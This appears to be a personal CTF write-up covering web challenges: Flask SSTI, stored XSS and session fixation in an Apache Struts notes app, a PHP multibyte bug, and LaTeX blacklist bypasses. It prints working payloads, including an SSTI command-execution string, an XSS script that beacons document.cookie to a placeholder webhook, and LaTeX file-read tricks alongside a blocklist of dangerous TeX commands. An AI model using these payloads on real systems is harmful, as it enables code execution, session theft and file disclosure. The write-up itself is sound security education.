Solves: OS Detection(Web), Notes(web)
## OS Detection.
#langs/python 
A SSTI challenge with source code provided. 
```python
from flask import Flask, request, render_template, render_template_string
from ua_parser import user_agent_parser

app = Flask(__name__)

@app.route("/")
def home():
    user_agent = request.headers.get('User-Agent')
    try:
        parsed_string = user_agent_parser.Parse(user_agent)
        family = parsed_string['os']['family']
        user_agent_hint = render_template_string(user_agent)
        return render_template('index.html', os=family, user_agent=user_agent_hint)
    except Exception as e:
        return render_template('failure.html', error=str(e))
    
@app.route("/source")
def source():
    code = open(__file__).read()
    return render_template_string("<pre>{{ code }}</pre>", code=code)
    

if __name__ == "__main__":
    # No debug, that would be insecure!
    #app.run(debug=True)
    app.run()
```
Our user agent is directly passed to `render_template_string` to be rendered, leading to SSTI.
Payload:
```python
{{cycler.__init__.__globals__.os.popen('cat /app/flag/flag.txt').read()}}
```
`PP{h4ck3r-OS-d3t3ct3d::BEZvg-hcyu2a}`
## Notes
#langs/java 
#libs/apache-struts
A java web server featuring a note management app. Source code is provided
### Intended solution
 The goal of this challenge is to steal the cookie of an admin bot. After registering and messing around, we find that notes stored aren't escaped when displayed, allowing for XSS.
```html
...
<p class="block">  
  <s:if test="note.body == ''">  
    <em>This note is empty</em>  
  </s:if>  
  <s:else>  
    <s:property escapeHtml="false" value="note.body"/>  
  </s:else>  
</p>
...
```
With this, we could craft a payload such as
```html
<script>
navigator.sendBeacon("<webhook>/?q="+document.cookie)
</script>
```
and get the bot to visit our note using `/report`. 
```java
public class ReportAction extends ActionSupport implements ServletRequestAware {
	...
	@AllowMethod(HttpMethod.GET)  
	@AllowMethod(HttpMethod.POST)  
	public String execute() {  
	    if (HttpMethod.GET.equals(this.request.getMethod())) {  
	        return INPUT;  
	    }  
	  
	    if (this.isNullOrEmpty(this.title)) {  
	        addFieldError("title", "Please provide a title");  
	    }  
	    if (this.isNullOrEmpty(this.getJoinedDescription())) {  
	        addFieldError("description", "Please provide a description");  
	    }  
	    if (this.isNullOrEmpty(this.url)) {  
	        addFieldError("url", "Please provide a URL");  
	    } else {  
	        try {  
	            URI uri = new URI(this.url);  
	            uri.toURL();  
	        } catch (IllegalArgumentException | URISyntaxException | MalformedURLException ex) {  
	            addFieldError("url", "Please provide a valid URL");  
	        }  
	    }  
	    if (hasFieldErrors()) {  
	        return INPUT;  
	    }  
	  
	    try (Playwright playwright = Playwright.create()) {  
	        Browser browser;  
	        if (System.getenv("DOCKER") != null) {  
	            browser = playwright.chromium().launch();  
	        } else {  
	            browser = playwright.chromium().launch(new LaunchOptions().setExecutablePath(Path.of("/usr/bin/chromium")));  
	        }  
	  
	        BrowserContext context;  
	        if (System.getenv("DOCKER") != null) {  
	            context = browser.newContext(new Browser.NewContextOptions().setStorageStatePath(Paths.get("/var/lib/jetty/browser-state.json")));  
	        } else {  
	            context = browser.newContext(new Browser.NewContextOptions().setStorageStatePath(Paths.get("browser-state.json")));  
	        }  
	        context.setDefaultTimeout(10_000);  
	  
	        Page page = context.newPage();  
	        if (!page.navigate(this.url).ok()) {  
	            this.addActionError("Could not reach provided url");  
	            return ERROR;  
	        }  
	        this.screenshot = page.screenshot();  
	        page.close();  
	    } catch (Exception ex) {  
	        this.addActionError("Unknown error: " + ex.getMessage());  
	        return ERROR;  
	    }  
	  
	    return SUCCESS;  
	}
	...
}
```
Unfortunately, notes are tied to a user account and can't be viewed by anyone else. 
```java
@LoginRequired  
@AllowMethod(HttpMethod.POST)  
public String create() {  
    this.id = this.getUser().createNote().getId();  
  
    return INPUT;  
}

@LoginRequired  
@AllowMethod(HttpMethod.GET)  
@AllowMethod(HttpMethod.POST)  
public String edit() {  
    if (!this.getUser().getNote(this.id).isPresent()) {  
        return "not-found";  
    }  
  
    if (HttpMethod.GET.equals(this.request.getMethod())) {  
        return INPUT;  
    }  
  
    this.getNote().setTitle(this.title);  
    this.getNote().setBody(this.body);  
  
    return "view";  
}
```
`User.java`:
```java
public Optional<Note> getNote(UUID id) {  
    return Optional.ofNullable(this.notes.get(id));  
}
```
From here, we have only 2 options: Get the bot to view and create its own notes or get the bot to somehow view our note. Checking the stored cookies, we see that there seems to be a session cookie stored.
![[Pasted image 20241213183023.png]]
> From this point, I'll just reference the solution of the challenge author.
> "For some reason, I tried to access my app with `curl` and noticed that all URLs generated with helpers from the framework include the session cookie: `/sample.action;jsessionid=[…]`."

The Apache Struts framework seems to be able to store the session cookie within the url if cookies are disabled/disallowed. We can test this by [blocking cookie access](https://support.mozilla.org/en-US/kb/block-websites-storing-cookies-site-data-firefox) and see the cookie embedded in the url.
![[Pasted image 20241213183703.png]]
By giving this cookie to the bot, we can give it our account and have it view our payload, thus exfiltrating the cookie.
### The cheese
With most browsers, the `file://` protocol is also supported, allowing users to view a file locally from within the browser. One interesting thing to note about this challenge that the cookies are loaded from a file, meaning we can also view the cookies from the browser
```java
	            context = browser.newContext(new Browser.NewContextOptions().setStorageStatePath(Paths.get("/var/lib/jetty/browser-state.json")));  
```
We can report the `file:///var/lib/jetty/browser-state.json` url and it will be successfully parsed and accepted by `URI()`, while the challenge kindly screenshots the resulting page for us, allowing us to view the flag.
![[Pasted image 20241213184222.png]]
> Lessons learnt: Maybe try screwing around with cookie access from the browser and see if the server supports storing cookies in some other way(The url in this case)
# Post ctf lessons
## Pretty HTML Page
#langs/php 
If a challenge is really simple and has little external dependencies, you should check for  issues related to the language itself, even if the language version is roughly up to date. Especially for php.
```php
<?php  
    if ($_SERVER["REQUEST_METHOD"] == "POST") {  
        $input = $_POST["input_string"];  
        echo "input is " . $input;  
        if (mb_strpos($input, "flag") !== false) {  
            $a = mb_strpos($input, "flag");  
            echo "<p>Input contains 'flag' at position " . $a . "</p>";  
            $b = mb_substr($input, 0, $a);  
            echo "redacted to " . $b;  
            $input = $b . "REDACTED";  
            echo "<p>You wrote: " . htmlentities($input, ENT_QUOTES, 'UTF-8') . "</p>";  
        }  
        else {  
            echo "<p>Input does not contain 'flag'</p>";  
            $b = $input;  
            echo "<p>You wrote: " . htmlentities($b, ENT_QUOTES, 'UTF-8') . "</p>";  
        }  
          
        if (mb_strpos($b, "flag") !== false) {  
            $file_to_flag = "/flag/flag.txt";  
            $flag = file_get_contents($file_to_flag);  
            echo "<p>Congrats! Here is your flag: " . $flag . "</p>";  
        }  
    }  
?>
```
From the code, the only 2 functions that determined if we got the flag were `mb_strpos` and `mb_substr`, hence the focus should have been on them.
In this case, searching for `php mb_strpos cve`  lead me to this link: https://www.sonarsource.com/blog/joomla-multiple-xss-vulnerabilities/
## TeXnically Insecure + TeXnically Insecure Revenge
#langs/latex
A site which parses a latex document to pdf. Reviewing the code, we see some latex commands are blacklisted:
```python
TEX_TEMPLATE = r"""
\documentclass{article}
\begin{document}
%s
\end{document}
"""

dangerous_commands = [
    r'\\openin', r'\\newread', r'\\include', r'\\usepackage', r'\\closein', r'\\newwrite', r'\\openout',
    r'\\write', r'\\closeout', r'\\write18', r'\\url', r'\\read', r'\\input', r'\\def', r'\^', r'\\catcode',
    r'\\immediate', r'\\csname', r'\\makeatletter', r'\\readline', r'\\uccode', r'\\lccode'
]

def check_for_dangerous_commands(latex_input):
    found_commands = []

    for command in dangerous_commands:
        if re.search(command, latex_input, flags=re.IGNORECASE):
            found_commands.append(command)

    if found_commands:
        raise ValueError(f"Dangerous LaTeX commands found: {', '.join(found_commands)}")

    return latex_input
@app.route('/render', methods=['POST'])
def render_latex():
    try:
        latex_input = request.form['latex']

        check_for_dangerous_commands(latex_input)
        
        tex_file = "output.tex"
        with open(tex_file, "w") as f:
            f.write(TEX_TEMPLATE % latex_input)
        
        subprocess.run(["pdflatex", "-interaction=nonstopmode", tex_file])

        pdf_file = "output.pdf"
        if os.path.exists(pdf_file):
            return send_file(pdf_file, mimetype='application/pdf')
        else:
            return "Error in generating PDF"

    except ValueError as e:
        return str(e), 400
  
    finally:
        files = ["output.tex", "output.pdf", "output.log", "output.aux"]
        for file in files:
            if os.path.exists(file):
                os.remove(file)
```
While I was attempting the challenge, a revenge challenge was released. By diffing the files, we see the blacklist in the revenge is now stricter, triggering as long as any of the keywords exist
```python
dangerous_commands = [
    r'openin', r'newread', r'include', r'usepackage', r'closein', r'newwrite', r'openout',
    r'write', r'closeout', r'write18', r'url', r'read', r'input', r'def', r'\^', r'catcode',
    r'immediate', r'csname', r'makeatletter', r'readline', r'uccode', r'lccode'
]
```
I eventually found a payload from https://book.jorianwoltjer.com/languages/latex#filter-bypass#:~:text=begin{input},end{input} which did not require `\input`, and could bypass the blacklist for the first challenge.
`\begin{input}/flag/flag.txt\end{input}`
For the revenge challenge, I've compiled a list of payloads from the discord
`\begin{inpu\iftrue t\fi}{"/flag/flag.txt"}` by roehrt

```
\pdfobj stream file {/flag/flag.txt}
\pdfrefobj 1
hallo
```
> "in both versions to directly embed the flag in the pdf as a raw stream, because that's apparently something people have a legitimate use-case for?"

by tomato6333
```
\ttfamily
\pdffiledump offset 0 length \pdffilesize{/flag/flag.txt}{/flag/flag.txt}
```
by vicevirus

`\begin{input}{/flag/flag.txt}` also works actually
by liekedaeler(Chal author)

Lastly, there is an official writeup by the challenge author at [[TeXnically_Insecure_author_writeup]]
## Secure sign on
#langs/rust
Account takeover from improper merging.
TODO: Basically, always trust your logs and check if something seems off: In this case, I incorrectly assumed user registration would happen instantly as the cat video note would be clicked immediately. However, the original db creation had never included such a note. Additionally, the logs showed there was a constant request to the notes page, and I had no clue why the requests to the notes page by the bot was still being made. Turns out, it was waiting for a cat video note to be posted(by the attacker). 